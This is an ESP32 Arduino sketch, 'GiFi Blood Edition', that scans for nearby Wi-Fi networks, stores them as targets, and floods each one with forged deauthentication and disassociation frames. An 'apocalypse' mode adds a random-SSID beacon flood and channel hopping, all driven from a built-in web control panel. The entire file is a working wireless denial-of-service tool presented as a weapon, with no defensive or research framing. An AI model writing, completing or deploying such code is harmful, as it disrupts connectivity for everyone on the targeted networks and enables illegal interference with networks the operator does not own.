#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>
#include <EEPROM.h>
#include <ArduinoJson.h>
#include <Update.h>

// إعدادات القوة القصوى
#define MAX_TARGETS 200
#define EEPROM_SIZE 8192
#define PACKET_BURST 100
#define MAX_CHANNELS 14
#define MAX_POWER 255
#define ATTACK_THREADS 5

// هياكل البيانات المتطورة
struct BloodTarget {
  uint8_t mac[6];
  int channel;
  uint32_t packetCount;
  bool active;
  String ssid;
  int rssi;
  uint8_t attackType;
  uint32_t lastHit;
};

struct AttackThread {
  bool active;
  int targetIndex;
  uint32_t packetsSent;
};

// المتغيرات العالمية فائقة القوة
BloodTarget targets[MAX_TARGETS];
AttackThread threads[ATTACK_THREADS];
int targetCount = 0;
WebServer server(80);
bool bloodAttack = false;
bool apocalypseMode = false;
unsigned long bloodStartTime = 0;
int currentBloodChannel = 1;
uint64_t totalPacketsSent = 0;
int attackPower = 255;
int attackSpeed = 100;
String systemStatus = "READY";

// إطارات هجوم متقدمة
typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t seq_ctrl[2];
  uint8_t reason[2];
} __attribute__((packed)) blood_deauth_frame_t;

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t seq_ctrl[2];
} __attribute__((packed)) blood_disassoc_frame_t;

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t ra[6];
  uint8_t ta[6];
  uint8_t bssid[6];
  uint8_t seq_ctrl[2];
  uint8_t timestamp[8];
  uint8_t beacon_interval[2];
  uint8_t capability_info[2];
  uint8_t ssid_len;
  uint8_t ssid[32];
} __attribute__((packed)) blood_beacon_frame_t;

void setup() {
  Serial.begin(1152000);
  EEPROM.begin(EEPROM_SIZE);
  
  // عرض البانر الدموي
  showBloodBanner();
  
  // التهيئة النهائية
  setupBloodWiFi();
  setupBloodWebServer();
  loadBloodTargets();
  initAttackThreads();
  
  Serial.println("🩸 GiFi BLOOD EDITION ACTIVATED - APOCALYPSE MODE READY");
  Serial.println("💀 Developed by: أحمد نور أحمد - THE ULTIMATE WEAPON");
}

void showBloodBanner() {
  Serial.println();
  Serial.println("#######################################################");
  Serial.println("#    ██████╗ ██╗███████╗██╗    ██████╗ ██████╗  ██████╗ #");
  Serial.println("#    ██╔════╝ ██║██╔════╝██║    ██╔══██╗██╔══██╗██╔════╝ #");
  Serial.println("#    ██║  ███╗██║█████╗  ██║    ██████╔╝██║  ██║██║      #");
  Serial.println("#    ██║   ██║██║██╔══╝  ██║    ██╔══██╗██║  ██║██║      #");
  Serial.println("#    ╚██████╔╝██║██║     ██║    ██████╔╝██████╔╝╚██████╗ #");
  Serial.println("#     ╚═════╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ #");
  Serial.println("#                                                       #");
  Serial.println("#           B L O O D   E D I T I O N                   #");
  Serial.println("#           Developed by: أحمد نور أحمد               #");
  Serial.println("#              APOCALYPSE MODE ACTIVATED               #");
  Serial.println("#######################################################");
  Serial.println();
}

void setupBloodWiFi() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  
  // إعدادات WiFi بقوة دموية
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  // الطاقة القصوى المطلقة
  esp_wifi_set_max_tx_power(MAX_POWER);
  esp_wifi_config_espnow_rate(WIFI_IF_STA, WIFI_PHY_RATE_MCS7_SGI);
  
  // إعدادات متقدمة للطاقة
  esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT40);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  
  esp_wifi_start();
  
  // المسح الدموي للشبكات
  bloodNetworkScan();
}

void bloodNetworkScan() {
  Serial.println("🩸 INITIATING BLOOD NETWORK SCAN...");
  systemStatus = "SCANNING";
  
  for (int chan = 1; chan <= MAX_CHANNELS; chan++) {
    setBloodChannel(chan);
    delay(25);
    
    int scanResult = WiFi.scanNetworks(false, true, true, 200);
    
    Serial.printf("💀 CHANNEL %d: SLAUGHTERED %d NETWORKS\n", chan, scanResult);
    
    for (int i = 0; i < scanResult; i++) {
      String ssid = WiFi.SSID(i);
      String bssid = WiFi.BSSIDstr(i);
      int rssi = WiFi.RSSI(i);
      int channel = WiFi.channel(i);
      
      if (ssid.length() > 0 && rssi > -90) {
        Serial.printf("🎯 TARGET ELIMINATED: %s | %s | CH:%d | POWER:%d\n", 
                     ssid.c_str(), bssid.c_str(), channel, rssi);
        addBloodTarget(bssid, channel, ssid, rssi);
      }
    }
    WiFi.scanDelete();
  }
  Serial.printf("🩸 TOTAL TARGETS EXTERMINATED: %d\n", targetCount);
  systemStatus = "READY";
}

void setBloodChannel(int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  currentBloodChannel = channel;
}

void addBloodTarget(String bssid, int channel, String ssid, int rssi) {
  if (targetCount >= MAX_TARGETS) return;
  
  sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &targets[targetCount].mac[0], &targets[targetCount].mac[1],
         &targets[targetCount].mac[2], &targets[targetCount].mac[3],
         &targets[targetCount].mac[4], &targets[targetCount].mac[5]);
  
  targets[targetCount].channel = channel;
  targets[targetCount].ssid = ssid;
  targets[targetCount].rssi = rssi;
  targets[targetCount].active = true;
  targets[targetCount].packetCount = 0;
  targets[targetCount].attackType = random(3);
  targets[targetCount].lastHit = millis();
  
  targetCount++;
  saveBloodTargets();
}

void initAttackThreads() {
  for (int i = 0; i < ATTACK_THREADS; i++) {
    threads[i].active = false;
    threads[i].targetIndex = 0;
    threads[i].packetsSent = 0;
  }
}

void executeBloodDeauth(int targetIndex) {
  if (targetIndex >= targetCount) return;
  
  blood_deauth_frame_t deauth;
  blood_disassoc_frame_t disassoc;
  
  // إعداد الإطارات الدموية
  memset(&deauth, 0, sizeof(deauth));
  deauth.frame_ctrl[0] = 0xC0;
  deauth.frame_ctrl[1] = 0x00;
  deauth.reason[0] = 0x07;
  
  memset(&disassoc, 0, sizeof(disassoc));
  disassoc.frame_ctrl[0] = 0xA0;
  disassoc.frame_ctrl[1] = 0x00;
  
  setBloodChannel(targets[targetIndex].channel);
  
  memcpy(deauth.dest, targets[targetIndex].mac, 6);
  memcpy(deauth.src, targets[targetIndex].mac, 6);
  memcpy(deauth.bssid, targets[targetIndex].mac, 6);
  
  memcpy(disassoc.dest, targets[targetIndex].mac, 6);
  memcpy(disassoc.src, targets[targetIndex].mac, 6);
  memcpy(disassoc.bssid, targets[targetIndex].mac, 6);
  
  // هجوم دموي مكثف
  int burstSize = PACKET_BURST * attackPower / 100 * attackSpeed / 100;
  
  for (int j = 0; j < burstSize; j++) {
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
    esp_wifi_80211_tx(WIFI_IF_STA, &disassoc, sizeof(disassoc), false);
    
    targets[targetIndex].packetCount += 2;
    threads[targetIndex % ATTACK_THREADS].packetsSent += 2;
    totalPacketsSent += 2;
    
    if (j % 10 == 0) delayMicroseconds(50);
  }
  
  targets[targetIndex].lastHit = millis();
}

void executeBeaconFlood() {
  blood_beacon_frame_t beacon;
  memset(&beacon, 0, sizeof(beacon));
  
  beacon.frame_ctrl[0] = 0x80;
  beacon.frame_ctrl[1] = 0x00;
  beacon.beacon_interval[0] = 0x64;
  beacon.beacon_interval[1] = 0x00;
  beacon.capability_info[0] = 0x31;
  beacon.capability_info[1] = 0x04;
  
  for (int i = 0; i < 20; i++) {
    // عناوين MAC عشوائية
    for(int j = 0; j < 6; j++) {
      beacon.ra[j] = random(256);
      beacon.ta[j] = random(256);
      beacon.bssid[j] = random(256);
    }
    
    // SSID عشوائي
    beacon.ssid_len = 10 + random(10);
    for(int j = 0; j < beacon.ssid_len; j++) {
      beacon.ssid[j] = 33 + random(94);
    }
    
    esp_wifi_80211_tx(WIFI_IF_STA, &beacon, 38 + beacon.ssid_len, false);
    totalPacketsSent++;
  }
}

void apocalypseAttack() {
  // هجوم نهاية العالم - كل الخيوط تعمل
  for (int i = 0; i < min(ATTACK_THREADS, targetCount); i++) {
    if (!threads[i].active) {
      threads[i].active = true;
      threads[i].targetIndex = i;
    }
    executeBloodDeauth(threads[i].targetIndex);
  }
  
  // هجمات إضافية في وضع نهاية العالم
  if (apocalypseMode) {
    executeBeaconFlood();
    
    // هجوم تغيير القنوات السريع
    static unsigned long lastChannelChange = 0;
    if (millis() - lastChannelChange > 100) {
      currentBloodChannel = (currentBloodChannel % MAX_CHANNELS) + 1;
      setBloodChannel(currentBloodChannel);
      lastChannelChange = millis();
    }
  }
  
  // تدوير الأهداف بين الخيوط
  static unsigned long lastTargetRotate = 0;
  if (millis() - lastTargetRotate > 5000) {
    for (int i = 0; i < ATTACK_THREADS; i++) {
      threads[i].targetIndex = (threads[i].targetIndex + 1) % targetCount;
    }
    lastTargetRotate = millis();
  }
}

void setupBloodWebServer() {
  server.on("/", HTTP_GET, []() {
    String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>GiFi BLOOD EDITION - APOCALYPSE MODE</title>
      <meta charset="UTF-8">
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: 'Rajdhani', sans-serif;
          background: #000;
          color: #ff0000;
          overflow-x: hidden;
          background: radial-gradient(circle, #200000, #000000);
        }
        .blood-bg {
          position: fixed;
          top: 0; left: 0;
          width: 100%; height: 100%;
          background: 
            radial-gradient(circle at 20% 80%, rgba(255,0,0,0.1) 0%, transparent 50%),
            radial-gradient(circle at 80% 20%, rgba(139,0,0,0.1) 0%, transparent 50%),
            radial-gradient(circle at 40% 40%, rgba(255,0,0,0.05) 0%, transparent 50%);
          animation: bloodPulse 4s ease-in-out infinite;
          pointer-events: none;
          z-index: -2;
        }
        .blood-drips {
          position: fixed;
          top: 0; left: 0;
          width: 100%; height: 100%;
          background-image: 
            linear-gradient(87deg, transparent 45%, rgba(255,0,0,0.1) 45%, rgba(255,0,0,0.1) 55%, transparent 0),
            linear-gradient(93deg, transparent 45%, rgba(139,0,0,0.1) 45%, rgba(139,0,0,0.1) 55%, transparent 0);
          pointer-events: none;
          z-index: -1;
        }
        .container {
          max-width: 1400px;
          margin: 0 auto;
          padding: 20px;
          position: relative;
          z-index: 1;
        }
        .header {
          text-align: center;
          padding: 40px 0;
          border-bottom: 3px solid #ff0000;
          margin-bottom: 40px;
          text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
          background: linear-gradient(45deg, transparent, rgba(255,0,0,0.1), transparent);
        }
        .blood-title {
          font-family: 'Orbitron', sans-serif;
          font-size: 4.5em;
          color: #ff0000;
          margin-bottom: 10px;
          background: linear-gradient(45deg, #ff0000, #ff4444, #ff0000);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          animation: bloodFlow 3s ease-in-out infinite;
        }
        .developer {
          font-size: 1.4em;
          color: #ff4444;
          margin-bottom: 20px;
          text-transform: uppercase;
          letter-spacing: 3px;
        }
        .control-panel {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
          gap: 25px;
          margin-bottom: 40px;
        }
        .control-card {
          background: rgba(32, 0, 0, 0.9);
          border: 2px solid #ff0000;
          padding: 25px;
          border-radius: 8px;
          box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
          backdrop-filter: blur(10px);
          transition: all 0.3s;
        }
        .control-card:hover {
          box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
          transform: translateY(-5px);
        }
        .btn {
          width: 100%;
          padding: 18px;
          margin: 12px 0;
          border: none;
          border-radius: 5px;
          font-family: 'Orbitron', sans-serif;
          font-size: 1.2em;
          cursor: pointer;
          transition: all 0.3s;
          text-transform: uppercase;
          letter-spacing: 2px;
          position: relative;
          overflow: hidden;
        }
        .btn::before {
          content: '';
          position: absolute;
          top: 0; left: -100%;
          width: 100%; height: 100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
          transition: left 0.5s;
        }
        .btn:hover::before {
          left: 100%;
        }
        .btn-apocalypse {
          background: linear-gradient(45deg, #ff0000, #8b0000, #ff0000);
          color: #000;
          box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
        }
        .btn-stop {
          background: linear-gradient(45deg, #000000, #330000, #000000);
          color: #ff0000;
          border: 2px solid #ff0000;
          box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
        }
        .btn-scan {
          background: linear-gradient(45deg, #8b0000, #660000, #8b0000);
          color: #fff;
          box-shadow: 0 0 25px rgba(139, 0, 0, 0.6);
        }
        .stats-panel {
          background: rgba(16, 0, 0, 0.95);
          border: 2px solid #ff0000;
          padding: 25px;
          margin: 30px 0;
          border-radius: 8px;
          box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
        }
        .stat-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-top: 20px;
        }
        .stat-item {
          background: rgba(255, 0, 0, 0.1);
          padding: 15px;
          border-radius: 5px;
          border-left: 4px solid #ff0000;
          transition: all 0.3s;
        }
        .stat-item:hover {
          background: rgba(255, 0, 0, 0.2);
          transform: translateX(5px);
        }
        .targets-list {
          max-height: 500px;
          overflow-y: auto;
          margin-top: 20px;
          border: 1px solid #ff0000;
          border-radius: 5px;
          background: rgba(8, 0, 0, 0.9);
        }
        .target-item {
          background: rgba(255, 0, 0, 0.05);
          margin: 8px;
          padding: 12px;
          border: 1px solid #ff0000;
          border-radius: 3px;
          transition: all 0.3s;
        }
        .target-item:hover {
          background: rgba(255, 0, 0, 0.1);
          border-color: #ff4444;
        }
        .power-control {
          display: flex;
          align-items: center;
          gap: 15px;
          margin: 20px 0;
          padding: 15px;
          background: rgba(255, 0, 0, 0.05);
          border-radius: 5px;
        }
        .power-slider {
          flex: 1;
          height: 25px;
          background: #330000;
          border: 1px solid #ff0000;
          border-radius: 12px;
          overflow: hidden;
        }
        .power-level {
          height: 100%;
          background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000, #8b0000);
          border-radius: 12px;
          transition: width 0.3s;
          box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        .thread-status {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
          gap: 10px;
          margin-top: 15px;
        }
        .thread {
          padding: 10px;
          background: rgba(255, 0, 0, 0.1);
          border-radius: 3px;
          text-align: center;
          border: 1px solid #ff0000;
        }
        .thread.active {
          background: rgba(255, 0, 0, 0.3);
          box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        @keyframes bloodPulse {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        @keyframes bloodFlow {
          0%, 100% { filter: hue-rotate(0deg); }
          50% { filter: hue-rotate(10deg); }
        }
        .pulse {
          animation: pulse 0.5s infinite;
        }
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
        .blood-text {
          color: #ff0000;
          text-shadow: 0 0 10px #ff0000;
        }
        ::-webkit-scrollbar {
          width: 12px;
        }
        ::-webkit-scrollbar-track {
          background: #330000;
        }
        ::-webkit-scrollbar-thumb {
          background: #ff0000;
          border-radius: 6px;
        }
        ::-webkit-scrollbar-thumb:hover {
          background: #ff4444;
        }
      </style>
    </head>
    <body>
      <div class="blood-bg"></div>
      <div class="blood-drips"></div>
      <div class="container">
        <div class="header">
          <h1 class="blood-title">G i F i &nbsp; B L O O D</h1>
          <div class="developer">Developed by: أحمد نور أحمد</div>
          <div class="developer">APOCALYPSE MODE - THE FINAL WEAPON</div>
        </div>
        
        <div class="control-panel">
          <div class="control-card">
            <h3 class="blood-text">💀 APOCALYPSE CONTROLS</h3>
            <button class="btn btn-apocalypse" onclick="sendCommand('apocalypse')">
              🩸 ACTIVATE APOCALYPSE
            </button>
            <button class="btn btn-stop" onclick="sendCommand('stop')">
              🛑 TOTAL ANNIHILATION
            </button>
            <button class="btn btn-scan" onclick="sendCommand('scan')">
              🔍 BLOOD SCAN
            </button>
          </div>
          
          <div class="control-card">
            <h3 class="blood-text">⚡ POWER CONTROL</h3>
            <div class="power-control">
              <span>BLOOD POWER:</span>
              <div class="power-slider">
                <div class="power-level" id="powerLevel" style="width: 100%"></div>
              </div>
              <span id="powerValue">255%</span>
            </div>
            <input type="range" min="10" max="255" value="255" class="btn" 
                   oninput="setPower(this.value)" style="width: 100%; background: #330000;">
            
            <div class="power-control">
              <span>ATTACK SPEED:</span>
              <div class="power-slider">
                <div class="power-level" id="speedLevel" style="width: 100%"></div>
              </div>
              <span id="speedValue">100%</span>
            </div>
            <input type="range" min="10" max="200" value="100" class="btn" 
                   oninput="setSpeed(this.value)" style="width: 100%; background: #330000;">
          </div>
        </div>
        
        <div class="stats-panel">
          <h3 class="blood-text">📊 BLOOD STATISTICS</h3>
          <div class="stat-grid">
            <div class="stat-item">
              <span>STATUS:</span>
              <span id="status" class="blood-text">READY</span>
            </div>
            <div class="stat-item">
              <span>TARGETS ELIMINATED:</span>
              <span id="targetCount" class="blood-text">0</span>
            </div>
            <div class="stat-item">
              <span>PACKETS SENT:</span>
              <span id="packetCount" class="blood-text">0</span>
            </div>
            <div class="stat-item">
              <span>ATTACK DURATION:</span>
              <span id="duration" class="blood-text">0s</span>
            </div>
            <div class="stat-item">
              <span>CURRENT CHANNEL:</span>
              <span id="channel" class="blood-text">1</span>
            </div>
            <div class="stat-item">
              <span>MODE:</span>
              <span id="mode" class="blood-text">NORMAL</span>
            </div>
          </div>
          
          <h4 class="blood-text" style="margin-top: 20px;">ATTACK THREADS:</h4>
          <div class="thread-status" id="threadStatus"></div>
        </div>
        
        <div class="control-card">
          <h3 class="blood-text">🎯 ELIMINATION TARGETS</h3>
          <div class="targets-list" id="targetsList"></div>
        </div>
      </div>

      <script>
        function sendCommand(cmd) {
          fetch('/' + cmd).then(r => r.text()).then(updateStatus);
        }
        
        function setPower(value) {
          document.getElementById('powerValue').textContent = value + '%';
          document.getElementById('powerLevel').style.width = (value/255*100) + '%';
          fetch('/power?value=' + value);
        }
        
        function setSpeed(value) {
          document.getElementById('speedValue').textContent = value + '%';
          document.getElementById('speedLevel').style.width = (value/2) + '%';
          fetch('/speed?value=' + value);
        }
        
        function updateAllData() {
          fetch('/status').then(r => r.json()).then(data => {
            document.getElementById('status').textContent = data.status;
            document.getElementById('targetCount').textContent = data.targets;
            document.getElementById('packetCount').textContent = data.packets.toLocaleString();
            document.getElementById('duration').textContent = data.duration + 's';
            document.getElementById('channel').textContent = data.channel;
            document.getElementById('mode').textContent = data.mode;
            
            let targetsHtml = '';
            data.targetList.forEach(target => {
              targetsHtml += `<div class="target-item">
                <strong class="blood-text">${target.ssid}</strong><br>
                MAC: ${target.mac} | CH: ${target.channel} | POWER: ${target.rssi}dBm<br>
                Packets: ${target.packets.toLocaleString()} | Last Hit: ${target.lastHit}s ago
              </div>`;
            });
            document.getElementById('targetsList').innerHTML = targetsHtml;
            
            let threadsHtml = '';
            data.threads.forEach((thread, index) => {
              threadsHtml += `<div class="thread ${thread.active ? 'active' : ''}">
                Thread ${index}: ${thread.active ? 'ACTIVE' : 'IDLE'}<br>
                Packets: ${thread.packets.toLocaleString()}
              </div>`;
            });
            document.getElementById('threadStatus').innerHTML = threadsHtml;
            
            // تأثير النبض للهجوم النشط
            if(data.status.includes('APOCALYPSE')) {
              document.getElementById('status').className = 'blood-text pulse';
              document.body.style.animation = 'bloodPulse 0.5s infinite';
            } else {
              document.getElementById('status').className = 'blood-text';
              document.body.style.animation = 'none';
            }
          });
        }
        
        setInterval(updateAllData, 500);
        updateAllData();
      </script>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", html);
  });
  
  server.on("/apocalypse", []() {
    bloodAttack = true;
    apocalypseMode = true;
    bloodStartTime = millis();
    systemStatus = "APOCALYPSE MODE ACTIVE";
    server.send(200, "text/plain", "🩸 APOCALYPSE ACTIVATED - TOTAL DESTRUCTION COMMENCING");
  });
  
  server.on("/stop", []() {
    bloodAttack = false;
    apocalypseMode = false;
    systemStatus = "ANNIHILATION COMPLETE";
    server.send(200, "text/plain", "🛑 APOCALYPSE TERMINATED - ALL TARGETS ELIMINATED");
  });
  
  server.on("/scan", []() {
    bloodNetworkScan();
    server.send(200, "text/plain", "🔍 BLOOD SCAN INITIATED - HUNTING TARGETS");
  });
  
  server.on("/power", []() {
    if (server.hasArg("value")) {
      attackPower = server.arg("value").toInt();
      server.send(200, "text/plain", "⚡ BLOOD POWER: " + String(attackPower) + "%");
    }
  });
  
  server.on("/speed", []() {
    if (server.hasArg("value")) {
      attackSpeed = server.arg("value").toInt();
      server.send(200, "text/plain", "💨 ATTACK SPEED: " + String(attackSpeed) + "%");
    }
  });
  
  server.on("/status", []() {
    DynamicJsonDocument doc(8192);
    doc["status"] = systemStatus;
    doc["targets"] = targetCount;
    doc["packets"] = totalPacketsSent;
    doc["duration"] = bloodAttack ? (millis() - bloodStartTime) / 1000 : 0;
    doc["channel"] = currentBloodChannel;
    doc["mode"] = apocalypseMode ? "APOCALYPSE" : "NORMAL";
    
    JsonArray targetArray = doc.createNestedArray("targetList");
    for (int i = 0; i < min(targetCount, 25); i++) {
      JsonObject target = targetArray.createNestedObject();
      target["ssid"] = targets[i].ssid;
      target["mac"] = formatMAC(targets[i].mac);
      target["channel"] = targets[i].channel;
      target["rssi"] = targets[i].rssi;
      target["packets"] = targets[i].packetCount;
      target["lastHit"] = (millis() - targets[i].lastHit) / 1000;
    }
    
    JsonArray threadArray = doc.createNestedArray("threads");
    for (int i = 0; i < ATTACK_THREADS; i++) {
      JsonObject thread = threadArray.createNestedObject();
      thread["active"] = threads[i].active;
      thread["packets"] = threads[i].packetsSent;
    }
    
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
  });
  
  server.begin();
}

String formatMAC(uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void loadBloodTargets() {
  EEPROM.get(0, targetCount);
  if (targetCount > MAX_TARGETS || targetCount < 0) targetCount = 0;
  
  for (int i = 0; i < targetCount; i++) {
    int addr = sizeof(int) + i * sizeof(BloodTarget);
    EEPROM.get(addr, targets[i]);
  }
}

void saveBloodTargets() {
  EEPROM.put(0, targetCount);
  for (int i = 0; i < targetCount; i++) {
    int addr = sizeof(int) + i * sizeof(BloodTarget);
    EEPROM.put(addr, targets[i]);
  }
  EEPROM.commit();
}

void loop() {
  server.handleClient();
  
  if (bloodAttack) {
    apocalypseAttack();
    
    // تحديث الإحصائيات
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate > 2000) {
      Serial.printf("🩸 APOCALYPSE STATUS | Targets: %d | Packets: %llu | Channel: %d | Power: %d\n",
                   targetCount, totalPacketsSent, currentBloodChannel, attackPower);
      lastUpdate = millis();
    }
  }
}
